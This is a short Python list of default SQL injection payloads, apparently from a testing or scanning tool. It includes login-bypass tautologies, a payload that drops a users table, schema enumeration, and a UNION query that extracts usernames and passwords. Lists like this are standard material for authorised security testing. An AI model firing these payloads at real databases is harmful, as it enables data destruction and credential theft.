# Default SQL Injection payloads
default_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='2",
    "'; DROP TABLE users; --",
    "'; SELECT * FROM information_schema.tables; --",
    "\" OR \"a\"=\"a",
    "' UNION SELECT NULL, username, password FROM users --",
    "admin' --",
    "' OR 'x'='x"
]
